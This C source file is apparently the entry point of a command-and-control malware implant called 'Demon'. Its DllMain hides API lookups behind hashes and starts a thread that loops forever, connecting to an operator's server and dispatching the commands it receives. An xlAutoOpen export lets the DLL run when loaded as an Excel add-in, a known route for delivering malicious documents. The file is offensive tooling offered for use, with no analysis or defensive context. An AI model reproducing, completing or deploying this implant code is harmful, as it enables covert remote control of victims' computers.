#define WIN32_LEAN_AND_MEAN
#include <Demon.h>

#include <Core/Command.h>
#include <Core/WinUtils.h>
#include "Common/Defines.h"
#include <Core/Transport.h>

HINSTANCE hAppInstance  = NULL;
PINSTANCE Instance      = & ( ( PINSTANCE ) { 0 } );

VOID Start(  );

#ifdef DLL_XLL
DLLEXPORT INT WINAPI xlAutoOpen(  )
{
    Start();

    return 0;
}
#endif

DLLEXPORT VOID Start(  )
{
    PUTS( "Start" )

    Instance->Session.ModuleBase = hAppInstance;

    DxInitialization(  );

    do
    {
        if ( ! Instance->Session.Connected )
        {
            if ( TransportInit( NULL ) )
                CommandDispatcher();
        }

        Instance->Win32.WaitForSingleObjectEx( NtCurrentThread(), Instance->Config.Sleeping * 1000, FALSE );
    } while ( TRUE );
}

BOOL WINAPI DllMain( HINSTANCE hDllBase, DWORD Reason, LPVOID Reserved )
{
    BOOL bReturnValue = TRUE;

    switch( Reason )
    {
        case DLL_PROCESS_ATTACH:
        {
            hAppInstance    = hDllBase;

            PVOID Kernel32  = LdrModulePeb( HASH_KERNEL32 );
            HANDLE ( WINAPI *NewThread ) (
                    LPSECURITY_ATTRIBUTES,
                    SIZE_T,
                    LPTHREAD_START_ROUTINE,
                    LPVOID,
                    DWORD,
                    LPDWORD
            ) = LdrFunctionAddr( Kernel32, 0x7f08f451 );

            NewThread( NULL, 0, Start, NULL, 0, NULL );
            break;
        }

        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return bReturnValue;
}